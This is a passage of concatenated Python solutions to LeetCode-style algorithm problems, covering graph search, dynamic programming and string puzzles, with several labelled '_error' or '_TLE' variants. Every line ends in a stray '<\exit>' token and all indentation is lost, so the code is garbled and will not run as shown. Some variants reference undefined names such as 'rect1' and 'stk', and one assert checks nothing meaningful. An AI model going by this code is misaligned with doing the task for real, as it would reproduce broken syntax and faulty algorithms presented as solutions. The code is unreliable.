for e in self.ret<\exit>
]<\exit>
def dfs(self, lst, S_lst, i):<\exit>
if len(lst) == len(S_lst):<\exit>
self.ret.append(list(lst))<\exit>
return<\exit>
if S_lst[i].isdigit():<\exit>
lst.append(S_lst[i])<\exit>
self.dfs(lst, S_lst, i + 1)<\exit>
lst.pop()<\exit>
else:<\exit>
lst.append(S_lst[i].lower())<\exit>
self.dfs(lst, S_lst, i + 1)<\exit>
lst.pop()<\exit>
lst.append(S_lst[i].upper())<\exit>
self.dfs(lst, S_lst, i + 1)<\exit>
lst.pop()<\exit>
if __name__ == "__main__":<\exit>
assert Solution().letterCasePermutation("a1b2") == ['a1b2', 'a1B2', 'A1b2', 'A1B2']<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def isBipartite(self, graph: List[List[int]]) -> bool:<\exit>
G = graph<\exit>
color = defaultdict(int)<\exit>
for k in range(len(G)):<\exit>
if k not in color:<\exit>
color[k] = 0<\exit>
if not self.dfs(G, k, color):<\exit>
return False<\exit>
return True<\exit>
def dfs(self, G, u, color):<\exit>
for nbr in G[u]:<\exit>
if nbr in color:<\exit>
if color[nbr] == color[u]:<\exit>
return False<\exit>
else:<\exit>
color[nbr] = 1 - color[u]<\exit>
if not self.dfs(G, nbr, color):<\exit>
return False<\exit>
return True<\exit>
class SolutionError:<\exit>
def isBipartite(self, graph: List[List[int]]) -> bool:<\exit>
G = graph<\exit>
A, B = set(), set()<\exit>
visited = defaultdict(bool)<\exit>
for k in range(len(G)):<\exit>
if not visited[k]:<\exit>
if not self.dfs(G, visited, k, A, B, True):<\exit>
return False<\exit>
return True<\exit>
def dfs(self, G, visited, u, A, B, is_A):<\exit>
visited[u] = True<\exit>
if is_A:<\exit>
A.add(u)<\exit>
else:<\exit>
B.add(u)<\exit>
for nbr in G[u]:<\exit>
if nbr in A if is_A else B:<\exit>
return False<\exit>
if not visited[nbr]:<\exit>
if not self.dfs(G, visited, nbr, A, B, False):<\exit>
return False<\exit>
return True<\exit>
from collections import defaultdict<\exit>
import heapq<\exit>
class Solution:<\exit>
def findCheapestPrice(self, n: int, flights: List[List[int]], src: int, dst: int, K: int) -> int:<\exit>
G = defaultdict(dict)<\exit>
visited = defaultdict(bool)<\exit>
for u, v, w in flights:<\exit>
G[u][v] = w<\exit>
pq = [(0, 0, src)]<\exit>
while pq:<\exit>
cost, k, u = heapq.heappop(pq)<\exit>
if u == dst:<\exit>
return cost<\exit>
stops = k - 1 + 1<\exit>
if stops <= K:<\exit>
for v, w in G[u].items():<\exit>
heapq.heappush(pq, (cost + w, k + 1, v))<\exit>
return -1<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def numMatchingSubseq(self, S: str, words: List[str]) -> int:<\exit>
itrs_m = defaultdict(list)<\exit>
for w in words:<\exit>
itrs_m[w[0]].append(<\exit>
iter(w[1:])<\exit>
)<\exit>
for a in S:<\exit>
itrs = itrs_m.pop(a, [])<\exit>
for itr in itrs:<\exit>
v = next(itr, None)<\exit>
itrs_m[v].append(itr)<\exit>
return len(itrs_m[None])<\exit>
def numMatchingSubseq_TLE(self, S: str, words: List[str]) -> int:<\exit>
I = [0 for _ in words]<\exit>
for a in S:<\exit>
for wi, i in enumerate(I):<\exit>
if i < len(words[wi]) and words[wi][i] == a:<\exit>
I[wi] += 1<\exit>
return sum(<\exit>
1<\exit>
for wi, i in enumerate(I)<\exit>
if i == len(words[wi])<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numMatchingSubseq("abcde", ["a", "bb", "acd", "ace"]) == 3<\exit>
from typing import List<\exit>
class Solution:<\exit>
def numSubarrayBoundedMax(self, A: List[int], L: int, R: int) -> int:<\exit>
F = 0<\exit>
ret = 0<\exit>
prev = -1<\exit>
for i, a in enumerate(A):<\exit>
if L <= a <= R:<\exit>
F = i - prev<\exit>
ret += F<\exit>
elif a > R:<\exit>
F = 0<\exit>
prev = i<\exit>
else:<\exit>
ret += F<\exit>
return ret<\exit>
def numSubarrayBoundedMax_error(self, A: List[int], L: int, R: int) -> int:<\exit>
F = 0<\exit>
ret = 0<\exit>
for a in A:<\exit>
if L <= a <= R:<\exit>
F += 1<\exit>
ret += F<\exit>
elif a > R:<\exit>
F = 0<\exit>
else:<\exit>
ret += F<\exit>
return ret<\exit>
class Solution:<\exit>
def rotateString(self, A: str, B: str) -> bool:<\exit>
if len(A) != len(B):<\exit>
return False<\exit>
if not A and not B:<\exit>
return True<\exit>
for i in range(1, len(A)):<\exit>
for j in range(len(B)):<\exit>
if A[(i + j) % len(A)] != B[j]:<\exit>
break<\exit>
else:<\exit>
return True<\exit>
return False<\exit>
from typing import List<\exit>
class Solution:<\exit>
def allPathsSourceTarget(self, graph: List[List[int]]) -> List[List[int]]:<\exit>
G = graph<\exit>
ret = []<\exit>
visited = [False for _ in G]<\exit>
self.dfs(G, 0, len(G) - 1, [0], visited, ret)<\exit>
return ret<\exit>
def dfs(self, G, cur, d, cur_path, visited, ret):<\exit>
if cur == d:<\exit>
ret.append(list(cur_path))<\exit>
return<\exit>
for nbr in G[cur]:<\exit>
if not visited[nbr]:<\exit>
visited[nbr] = True<\exit>
cur_path.append(nbr)<\exit>
self.dfs(G, nbr, d, cur_path, visited, ret)<\exit>
cur_path.pop()<\exit>
visited[nbr] = False<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def champagneTower(self, poured: int, query_row: int, query_glass: int) -> float:<\exit>
G = defaultdict(lambda: defaultdict(int))<\exit>
G[0][0] = poured<\exit>
for i in range(query_row):<\exit>
for j in range(i+1):<\exit>
excess = max(0, G[i][j] - 1)<\exit>
G[i+1][j] += excess / 2<\exit>
G[i+1][j+1] += excess / 2<\exit>
return min(1, G[query_row][query_glass])<\exit>
class Solution:<\exit>
def minSwap(self, A: List[int], B: List[int]) -> int:<\exit>
n = len(A)<\exit>
F = [[0 for _ in range(n)] for _ in range(2)]<\exit>
F[1][0] = 1<\exit>
for i in range(1, n):<\exit>
if A[i] > max(A[i-1], B[i-1]) and B[i] > max(A[i-1], B[i-1]):<\exit>
F[0][i] = min(F[0][i-1], F[1][i-1])<\exit>
F[1][i] = min(F[0][i-1], F[1][i-1]) + 1<\exit>
elif A[i] > A[i-1] and B[i] > B[i-1]:<\exit>
F[0][i] = F[0][i-1]<\exit>
F[1][i] = F[1][i-1] + 1<\exit>
else:<\exit>
F[0][i] = F[1][i-1]<\exit>
F[1][i] = F[0][i-1] + 1<\exit>
return min(F[0][n-1], F[1][n-1])<\exit>
def minSwap_error(self, A: List[int], B: List[int]) -> int:<\exit>
t = 0<\exit>
for i in range(1, len(A)):<\exit>
if A[i] <= A[i-1] or B[i] <= B[i-1]:<\exit>
t += 1<\exit>
if t < i + 1 - t:<\exit>
A[i], B[i] = B[i], A[i]<\exit>
else:<\exit>
t = i + 1 - t<\exit>
return t<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minSwap([0,4,4,5,9], [0,1,6,8,10])<\exit>
from typing import List, Set<\exit>
class Solution:<\exit>
def eventualSafeNodes(self, graph: List[List[int]]) -> List[int]:<\exit>
visit: List[int] = [0 for _ in graph]<\exit>
acyclic: Set[int] = set()<\exit>
for u in range(len(graph)):<\exit>
if visit[u] == 0:<\exit>
self.dfs(graph, u, visit, acyclic)<\exit>
return [<\exit>
u<\exit>
for u in range(len(graph))<\exit>
if u in acyclic<\exit>
]<\exit>
def dfs(self, graph, cur, visit, acyclic):<\exit>
visit[cur] = 1<\exit>
for nbr in graph[cur]:<\exit>
if visit[nbr] == 2:<\exit>
if nbr in acyclic:<\exit>
continue<\exit>
else:<\exit>
break<\exit>
if visit[nbr] == 1:<\exit>
break<\exit>
if visit[nbr] == 0 and not self.dfs(graph, nbr, visit, acyclic):<\exit>
break<\exit>
else:<\exit>
acyclic.add(cur)<\exit>
visit[cur] = 2<\exit>
return True<\exit>
visit[cur] = 2<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().eventualSafeNodes([[1,2],[2,3],[5],[0],[5],[],[]]) == [2,4,5,6]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxIncreaseKeepingSkyline(self, grid: List[List[int]]) -> int:<\exit>
m, n = len(grid), len(grid[0])<\exit>
lr = [<\exit>
max(row)<\exit>
for row in grid<\exit>
]<\exit>
tb = [<\exit>
max(<\exit>
grid[i][j]<\exit>
for i in range(m)<\exit>
)<\exit>
for j in range(n)<\exit>
]<\exit>
ret = 0<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
diff = min(lr[i], tb[j]) - grid[i][j]<\exit>
ret += diff<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def largestSumOfAverages(self, A: List[int], K: int) -> float:<\exit>
n = len(A)<\exit>
prefix_sum = [0 for _ in range(n+1)]<\exit>
for i in range(1, n+1):<\exit>
prefix_sum[i] = prefix_sum[i-1] + A[i-1]<\exit>
F = {}<\exit>
self.dfs(A, n, prefix_sum, F, K)<\exit>
return F[n, K]<\exit>
def dfs(self, A, l, prefix_sum, F, k):<\exit>
if l < k:<\exit>
return -float('inf')<\exit>
if (l, k) not in F:<\exit>
if k == 1:<\exit>
ret = prefix_sum[l] / l<\exit>
else:<\exit>
n = len(A)<\exit>
ret = -float('inf')<\exit>
for j in range(l-1, -1, -1):<\exit>
trail = (prefix_sum[l] - prefix_sum[j]) / (l - j)<\exit>
ret = max(<\exit>
ret,<\exit>
self.dfs(A, j, prefix_sum, F, k-1) + trail<\exit>
)<\exit>
F[l, k] = ret<\exit>
return F[l, k]<\exit>
def dfs_error(self, A, i, prefix_sum, F, k):<\exit>
if (i, k) not in F:<\exit>
ret = 0<\exit>
avg = prefix_sum[i] / i<\exit>
ret += avg<\exit>
ret += max(<\exit>
self.dfs(A, j, prefix_sum, F, k - 1)<\exit>
for j in range(i, len(A))<\exit>
)<\exit>
F[i, k] = ret<\exit>
return F[i, k]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().largestSumOfAverages([9,1,2,3,9], 3) == 20<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from typing import Tuple<\exit>
class Solution:<\exit>
def pruneTree(self, root: TreeNode) -> TreeNode:<\exit>
root, _ = self.prune(root)<\exit>
return root<\exit>
def prune(self, node) -> Tuple[TreeNode, bool]:<\exit>
if not node:<\exit>
return None, False<\exit>
node.left, contain_left = self.prune(node.left)<\exit>
node.right, contain_right = self.prune(node.right)<\exit>
if not contain_left and not contain_right and node.val == 0:<\exit>
return None, False<\exit>
return node, True<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def numBusesToDestination(self, routes: List[List[int]], S: int, T: int) -> int:<\exit>
if S == T:<\exit>
return 0<\exit>
routes = [set(e) for e in routes]<\exit>
G = defaultdict(set)<\exit>
for i in range(len(routes)):<\exit>
for j in range(i + 1, len(routes)):<\exit>
stops_1, stops_2 = routes[i], routes[j]<\exit>
for stop in stops_1:<\exit>
if stop in stops_2:<\exit>
G[i].add(j)<\exit>
G[j].add(i)<\exit>
break<\exit>
q = [i for i, stops in enumerate(routes) if S in stops]<\exit>
target_set = set([i for i, stops in enumerate(routes) if T in stops])<\exit>
visited = defaultdict(bool)<\exit>
for i in q:<\exit>
visited[i] = True<\exit>
step = 1<\exit>
while q:<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e in target_set:<\exit>
return step<\exit>
for nbr in G[e]:<\exit>
if not visited[nbr]:<\exit>
visited[nbr] = True<\exit>
cur_q.append(nbr)<\exit>
step += 1<\exit>
q = cur_q<\exit>
return -1<\exit>
def numBusesToDestination_TLE(self, routes: List[List[int]], S: int, T: int) -> int:<\exit>
G = defaultdict(set)<\exit>
for stops in routes:<\exit>
for i in range(len(stops)):<\exit>
for j in range(i + 1, len(stops)):<\exit>
u, v = stops[i], stops[j]<\exit>
G[u].add(v)<\exit>
G[v].add(u)<\exit>
q = [S]<\exit>
step = 0<\exit>
visited = defaultdict(bool)<\exit>
visited[S] = True<\exit>
while q:<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e == T:<\exit>
return step<\exit>
for nbr in G[e]:<\exit>
if not visited[nbr]:<\exit>
visited[nbr] = True<\exit>
cur_q.append(nbr)<\exit>
step += 1<\exit>
q = cur_q<\exit>
return -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numBusesToDestination([[1, 2, 7], [3, 6, 7]], 1, 6) == 2<\exit>
from typing import List<\exit>
class Solution:<\exit>
def minimumLengthEncoding(self, words: List[str]) -> int:<\exit>
root = {}<\exit>
ends = []<\exit>
for word in set(words):<\exit>
cur = root<\exit>
for c in word[::-1]:<\exit>
nxt = cur.get(c, {})<\exit>
cur[c] = nxt<\exit>
cur = nxt<\exit>
ends.append((cur, len(word)))<\exit>
return sum(<\exit>
l + 1<\exit>
for node, l in ends<\exit>
if len(node) == 0<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minimumLengthEncoding(["time", "me", "bell"]) == 10<\exit>
from typing import List<\exit>
class Solution:<\exit>
def shortestToChar(self, S: str, C: str) -> List[int]:<\exit>
idx = [<\exit>
i<\exit>
for i in range(len(S))<\exit>
if S[i] == C<\exit>
]<\exit>
idx = [-float("inf")] + idx + [float("inf")]<\exit>
ret = []<\exit>
i = 0<\exit>
for j in range(len(S)):<\exit>
while not idx[i] <= j < idx[i+1]:<\exit>
i += 1<\exit>
ret.append(min(j - idx[i], idx[i+1] - j))<\exit>
return ret<\exit>
from typing import List<\exit>
MOD =  10 ** 9 + 7<\exit>
class Solution:<\exit>
def numFactoredBinaryTrees(self, A: List[int]) -> int:<\exit>
A.sort()<\exit>
F = {}<\exit>
for i in range(len(A)):<\exit>
F[A[i]] = 1<\exit>
for j in range(i):<\exit>
if A[i] % A[j] == 0 and A[i] // A[j] in F:<\exit>
F[A[i]] += F[A[j]] * F[A[i] // A[j]]<\exit>
F[A[i]] %= MOD<\exit>
return sum(F.values()) % MOD<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxProfitAssignment(self, difficulty: List[int], profit: List[int], worker: List[int]) -> int:<\exit>
tasks = list(sorted(zip(profit, difficulty)))<\exit>
worker.sort()<\exit>
i = len(tasks) - 1<\exit>
j = len(worker) - 1<\exit>
ret = 0<\exit>
while i >= 0 and j >= 0:<\exit>
pro, diff = tasks[i]<\exit>
if worker[j] >= diff:<\exit>
ret += pro<\exit>
j -= 1<\exit>
else:<\exit>
i -= 1<\exit>
return ret<\exit>
class Solution:<\exit>
def consecutiveNumbersSum(self, N: int) -> int:<\exit>
cnt = 0<\exit>
k = 0<\exit>
while True:<\exit>
k += 1<\exit>
x0k = N - k * (k - 1) // 2<\exit>
if x0k <= 0 :<\exit>
break<\exit>
if x0k % k == 0:<\exit>
cnt += 1<\exit>
return cnt<\exit>
def consecutiveNumbersSum_error(self, N: int) -> int:<\exit>
cnt = 0<\exit>
for k in range(1, int(N ** 0.5)):<\exit>
x0k = N - k * (k - 1) // 2<\exit>
if x0k % k == 0:<\exit>
cnt += 1<\exit>
return cnt<\exit>
def consecutiveNumbersSum_error(self, N: int) -> int:<\exit>
if N == 1:<\exit>
return 1<\exit>
cnt = 0<\exit>
for i in range(1, N):<\exit>
d = N // i<\exit>
r = N % i<\exit>
if r == 0 and d - i // 2 > 0:<\exit>
cnt += 1<\exit>
elif r == 1 and N == (d + d + 1) * i // 2:<\exit>
cnt += 1<\exit>
return cnt<\exit>
from typing import List<\exit>
class Solution:<\exit>
def largeGroupPositions(self, S: str) -> List[List[int]]:<\exit>
i = 0<\exit>
j = 0<\exit>
ret = []<\exit>
n = len(S)<\exit>
while j < n:<\exit>
while j < n and S[i] == S[j]:<\exit>
j += 1<\exit>
if j - i >= 3:<\exit>
ret.append([i, j - 1])<\exit>
i = j<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def flipAndInvertImage(self, A: List[List[int]]) -> List[List[int]]:<\exit>
for row in A:<\exit>
prev = list(row)<\exit>
for i in range(len(row)):<\exit>
row[i] = prev[-1-i] ^ 1<\exit>
return A<\exit>
from typing import List<\exit>
class Solution:<\exit>
def isRectangleOverlap(self, rec1: List[int], rec2: List[int]) -> bool:<\exit>
return not (<\exit>
rec1[2] <= rec2[0] or<\exit>
rec1[0] >= rec2[2] or<\exit>
rec1[1] >= rec2[3] or<\exit>
rec1[3] <= rec2[1]<\exit>
)<\exit>
def isRectangleOverlap_error(self, rec1: List[int], rec2: List[int]) -> bool:<\exit>
if rec1[0] > rec2[0]:<\exit>
return self.isRectangleOverlap(rec2, rec1)<\exit>
return (<\exit>
rect1[0] < rect2[0] < rec1[2] and<\exit>
(<\exit>
rec2[1] < rect1[3] < rect2[3] or<\exit>
rec2[3] < rect1[3] < rect2[1]<\exit>
)<\exit>
)<\exit>
class Solution:<\exit>
def new21Game(self, N: int, K: int, W: int) -> float:<\exit>
if K == 0:<\exit>
return 1<\exit>
F = [0 for _ in range(N+1)]<\exit>
F[0] = 1<\exit>
cur_sum = F[0]<\exit>
ret = 0<\exit>
for i in range(1, N+1):<\exit>
F[i] = cur_sum * (1/W)<\exit>
if i >= K:<\exit>
ret += F[i]<\exit>
else:<\exit>
cur_sum += F[i]<\exit>
if i - W >= 0:<\exit>
cur_sum -= F[i - W]<\exit>
return ret<\exit>
def new21Game_error(self, N: int, K: int, W: int) -> float:<\exit>
F = [0 for _ in range(K+W+1)]<\exit>
F[0] = 1<\exit>
for i in range(1, K+W+1):<\exit>
for j in range(W, 0, -1):<\exit>
if i - j >= K:<\exit>
break<\exit>
if i - j >= 0:<\exit>
F[i] += F[i-j] * 1 / W<\exit>
ret = sum(F[1:N+1])<\exit>
print(F, ret)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().new21Game(6, 1, 10) == 0.6<\exit>
class Solution:<\exit>
def pushDominoes(self, dominoes: str) -> str:<\exit>
n = len(dominoes)<\exit>
L = [float("inf") for i in range(n)]<\exit>
R = [float("inf") for i in range(n)]<\exit>
for i in range(n-1, -1, -1):<\exit>
if dominoes[i] == "L":<\exit>
L[i] = 0<\exit>
elif dominoes[i] == "R":<\exit>
L[i] = float("inf")<\exit>
elif i + 1 < n:<\exit>
L[i] = L[i+1] + 1<\exit>
for i in range(n):<\exit>
if dominoes[i] == "R":<\exit>
R[i] = 0<\exit>
elif dominoes[i] == "L":<\exit>
R[i] = float("inf")<\exit>
elif i - 1 >= 0:<\exit>
R[i] = R[i-1] + 1<\exit>
ret = []<\exit>
for i in range(n):<\exit>
d = min(R[i], L[i])<\exit>
if d == float("inf"):<\exit>
cur = "."<\exit>
elif R[i] == L[i]:<\exit>
cur = "."<\exit>
elif d == R[i]:<\exit>
cur = "R"<\exit>
else:<\exit>
cur = "L"<\exit>
ret.append(cur)<\exit>
return "".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().pushDominoes(".L.R...LR..L..") == "LL.RR.LLRRLL.."<\exit>
from typing import List<\exit>
class Solution:<\exit>
def canVisitAllRooms(self, G: List[List[int]]) -> bool:<\exit>
n = len(G)<\exit>
visited = [0 for _ in range(n)]<\exit>
self.dfs(G, 0, visited)<\exit>
return all(e == 1 for e in visited)<\exit>
def dfs(self, G, u, visited):<\exit>
visited[u] = 1<\exit>
for nbr in G[u]:<\exit>
if not visited[nbr]:<\exit>
self.dfs(G, nbr, visited)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canVisitAllRooms([[1],[2],[3],[]]) == True<\exit>
assert Solution().canVisitAllRooms([[1,3],[3,0,1],[2],[0]]) == False<\exit>
from typing import List<\exit>
MAX = 2 ** 31 - 1<\exit>
class Solution:<\exit>
def splitIntoFibonacci(self, S: str) -> List[int]:<\exit>
l = len(S)<\exit>
for i in range(1, l + 1):<\exit>
num_str = S[:i]<\exit>
if len(num_str) > 1 and num_str.startswith("0"):<\exit>
continue<\exit>
num = int(num_str)<\exit>
if num > MAX:<\exit>
break<\exit>
for j in range(i + 1, l + 1):<\exit>
num2_str = S[i:j]<\exit>
if len(num2_str) > 1 and num2_str.startswith("0"):<\exit>
continue<\exit>
num2 = int(num2_str)<\exit>
if num2 > MAX:<\exit>
break<\exit>
ret = [num, num2]<\exit>
k = j<\exit>
while k < l:<\exit>
nxt = ret[-1] + ret[-2]<\exit>
if nxt > MAX:<\exit>
break<\exit>
nxt_str = str(nxt)<\exit>
if S[k:k+len(nxt_str)] == nxt_str:<\exit>
k = k + len(nxt_str)<\exit>
ret.append(nxt)<\exit>
else:<\exit>
break<\exit>
else:<\exit>
if k == l and len(ret) >= 3:<\exit>
return ret<\exit>
return []<\exit>
if __name__ == "__main__":<\exit>
assert Solution().splitIntoFibonacci("123456579") == [123,456,579]<\exit>
assert Solution().splitIntoFibonacci("01123581321345589") == [0,1,1,2,3,5,8,13,21,34,55,89]<\exit>
class Solution:<\exit>
def backspaceCompare(self, S: str, T: str) -> bool:<\exit>
return self.make_stk(S) == self.make_stk(T)<\exit>
def make_stk(self, S):<\exit>
stk = []<\exit>
for s in S:<\exit>
if s == "#":<\exit>
if stk:<\exit>
stk.pop()<\exit>
else:<\exit>
stk.append(s)<\exit>
return stk<\exit>
from typing import List<\exit>
class Solution:<\exit>
def longestMountain(self, A: List[int]) -> int:<\exit>
ret = 0<\exit>
up_cnt = 0<\exit>
down_cnt = 0<\exit>
for i in range(1, len(A)):<\exit>
if down_cnt and A[i] >= A[i-1]:<\exit>
up_cnt = 0<\exit>
down_cnt = 0<\exit>
if A[i] > A[i-1]:<\exit>
up_cnt += 1<\exit>
elif A[i] < A[i-1]:<\exit>
down_cnt += 1<\exit>
if up_cnt and down_cnt:<\exit>
ret = max(ret, up_cnt + down_cnt + 1)<\exit>
return ret<\exit>
def longestMountain(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
U = [0 for _ in A]<\exit>
D = [0 for _ in A]<\exit>
for i in range(1, n):<\exit>
if A[i] > A[i-1]:<\exit>
U[i] = U[i-1] + 1<\exit>
for i in range(n-2, -1, -1):<\exit>
if A[i] > A[i+1]:<\exit>
D[i] = D[i+1] + 1<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
if U[i] > 0 and D[i] > 0:<\exit>
ret = max(ret, U[i] + D[i] + 1)<\exit>
return ret<\exit>
def longestMountain_complicated(self, A: List[int]) -> int:<\exit>
ret = 0<\exit>
l = 1<\exit>
expect_incr = True<\exit>
for i in range(1, len(A)):<\exit>
if expect_incr:<\exit>
if A[i] > A[i-1]:<\exit>
l += 1<\exit>
elif A[i] < A[i-1] and l >= 2:<\exit>
expect_incr = False<\exit>
l += 1<\exit>
ret = max(ret, l)<\exit>
else:<\exit>
l = 1<\exit>
else:<\exit>
if A[i] < A[i-1]:<\exit>
l += 1<\exit>
ret = max(ret, l)<\exit>
elif A[i] == A[i-1]:<\exit>
expect_incr = True<\exit>
l = 1<\exit>
else:<\exit>
expect_incr = True<\exit>
l = 2<\exit>
return ret if ret >= 3 else 0<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestMountain([2,1,4,7,3,2,5]) == 5<\exit>
assert Solution().longestMountain([9,8,7,6,5,4,3,2,1,0]) == 0<\exit>
from typing import List<\exit>
from collections import Counter, deque<\exit>
import heapq<\exit>
class Solution:<\exit>
def isNStraightHand(self, A: List[int], W: int) -> bool:<\exit>
q = deque()<\exit>
counter = Counter(A)<\exit>
prev = 0<\exit>
prev_cnt = 0<\exit>
for k in sorted(counter):<\exit>
if prev_cnt > counter[k] or prev_cnt > 0 and k > prev + 1:<\exit>
return False<\exit>
q.append(counter[k] - prev_cnt)<\exit>
prev, prev_cnt = k, counter[k]<\exit>
if len(q) == W:<\exit>
c = q.popleft()<\exit>
prev_cnt -= c<\exit>
return prev_cnt == 0<\exit>
def isNStraightHand_heap(self, A: List[int], W: int) -> bool:<\exit>
A.sort()<\exit>
if len(A) % W != 0:<\exit>
return False<\exit>
if W == 1:<\exit>
return True<\exit>
h = []<\exit>
for a in A:<\exit>
if not h:<\exit>
h = [(a, [a])]<\exit>
continue<\exit>
if a == h[0][1][-1]:<\exit>
heapq.heappush(h, (a, [a]))<\exit>
elif a == h[0][1][-1] + 1:<\exit>
_, lst = heapq.heappop(h)<\exit>
lst.append(a)<\exit>
if len(lst) < W:<\exit>
heapq.heappush(h, (a, lst))<\exit>
else:<\exit>
return False<\exit>
if h:<\exit>
return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isNStraightHand([1,2,3,6,2,3,4,7,8], 3) == True<\exit>
assert Solution().isNStraightHand([1,1,2,2,3,3], 3) == True<\exit>
from typing import List<\exit>
class Solution:<\exit>
def shiftingLetters(self, S: str, shifts: List[int]) -> str:<\exit>
n = len(shifts)<\exit>
for i in range(n-2, -1, -1):<\exit>
shifts[i] += shifts[i+1]<\exit>
shifts[i] %= 26<\exit>
ret = []<\exit>
for i, s in enumerate(S):<\exit>
b = (ord(s) + shifts[i] - ord('a')) % 26 + ord('a')<\exit>
b = chr(b)<\exit>
ret.append(b)<\exit>
return "".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().shiftingLetters("abc", [3, 5, 9]) == "rpl"<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxDistToClosest(self, seats: List[int]) -> int:<\exit>
n = len(seats)<\exit>
L = [float("inf") for _ in range(n)]<\exit>
R = [float("inf") for _ in range(n)]<\exit>
for i in range(n):<\exit>
if seats[i] == 1:<\exit>
L[i] = 0<\exit>
elif i - 1 >= 0:<\exit>
L[i] = L[i-1] + 1<\exit>
for i in range(n-1, -1 , -1):<\exit>
if seats[i] == 1:<\exit>
R[i] = 0<\exit>
elif i + 1 < n:<\exit>
R[i] = R[i+1] + 1<\exit>
return max(<\exit>
min(L[i], R[i])<\exit>
for i in range(n)<\exit>
)<\exit>
def maxDistToClosest2(self, seats: List[int]) -> int:<\exit>
idxes = []<\exit>
for i, e in enumerate(seats):<\exit>
if e == 1:<\exit>
idxes.append(i)<\exit>
ret = [-float("inf"), 0]<\exit>
n = len(seats)<\exit>
for i, j in zip((0, n-1), (0, -1)):<\exit>
dist = abs(i - idxes[j])<\exit>
if dist > ret[0]:<\exit>
ret = [dist, i]<\exit>
for j in range(len(idxes) - 1):<\exit>
i = (idxes[j] + idxes[j+1]) // 2<\exit>
dist = min(abs(i - idxes[j]), abs(i - idxes[j+1]))<\exit>
if dist > ret[0]:<\exit>
ret = [dist, i]<\exit>
return ret[0]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxDistToClosest([1,0,0,0,1,0,1]) == 2<\exit>
import bisect<\exit>
class ExamRoom:<\exit>
def __init__(self, N: int):<\exit>
self.N = N<\exit>
self.idxes = []<\exit>
def seat(self) -> int:<\exit>
if not self.idxes:<\exit>
ret_idx = 0<\exit>
else:<\exit>
max_dist, ret_idx = 0, 0<\exit>
dist = self.idxes[0] - 0<\exit>
if dist > max_dist:<\exit>
max_dist = dist<\exit>
ret_idx = 0<\exit>
for j in range(len(self.idxes)-1):<\exit>
i = (self.idxes[j] + self.idxes[j+1]) // 2<\exit>
dist = min(abs(self.idxes[j] - i), abs(self.idxes[j+1] - i))<\exit>
if dist > max_dist:<\exit>
max_dist = dist<\exit>
ret_idx = i<\exit>
dist = self.N-1 - self.idxes[-1]<\exit>
if dist > max_dist:<\exit>
max_dist = dist<\exit>
ret_idx = self.N-1<\exit>
bisect.insort(self.idxes, ret_idx)<\exit>
return ret_idx<\exit>
def leave(self, p: int) -> None:<\exit>
self.idxes.remove(p)<\exit>
class Solution:<\exit>
def scoreOfParentheses(self, S: str) -> int:<\exit>
stk = []<\exit>
ret = 0<\exit>
for s in S:<\exit>
if s == "(":<\exit>
stk.append(0)<\exit>
else:<\exit>
cur = stk.pop()<\exit>
score = max(2 * cur, 1)<\exit>
if stk:<\exit>
stk[-1] += score<\exit>
else:<\exit>
ret += score<\exit>
return ret<\exit>
def scoreOfParentheses_error(self, S: str) -> int:<\exit>
ret = 0<\exit>
cur_stk = []<\exit>
for s in S:<\exit>
if s == "(":<\exit>
cur_stk.append(0)<\exit>
stk.append(s)<\exit>
else:<\exit>
stk.pop()<\exit>
if cur_stk[-1] == 0:<\exit>
cur_stk[-1] = 1<\exit>
else:<\exit>
cur_stk[-1] *= 2<\exit>
if not stk:<\exit>
ret += cur<\exit>
cur = 0<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().scoreOfParentheses("(())") == 2<\exit>
assert Solution().scoreOfParentheses("(()(()))") == 6<\exit>
USED = True<\exit>
class Solution:<\exit>
def buddyStrings(self, A: str, B: str) -> bool:<\exit>
if len(A) != len(B):<\exit>
return False<\exit>
if A == B:<\exit>
seen = set()<\exit>
for a in A:<\exit>
if a in seen:<\exit>
return True<\exit>
seen.add(a)<\exit>
else:<\exit>
return False<\exit>
pair = None<\exit>
for i in range(len(A)):<\exit>
if A[i] != B[i]:<\exit>
if not pair:<\exit>
pair = (A[i], B[i])<\exit>
elif pair == (B[i], A[i]):<\exit>
pair = USED<\exit>
else:<\exit>
return False<\exit>
if pair is None or pair is USED:<\exit>
return True<\exit>
return False<\exit>
class Solution:<\exit>
def lemonadeChange(self, bills: List[int]) -> bool:<\exit>
five, ten, twenty = 0, 0, 0<\exit>
for b in bills:<\exit>
if b == 5:<\exit>
five += 1<\exit>
elif b == 10:<\exit>
if five < 1:<\exit>
return False<\exit>
five -= 1<\exit>
ten += 1<\exit>
else:<\exit>
if ten >= 1 and five >= 1:<\exit>
ten -= 1<\exit>
five -= 1<\exit>
elif five >= 3:<\exit>
five -= 3<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
from typing import List<\exit>
class Solution:<\exit>
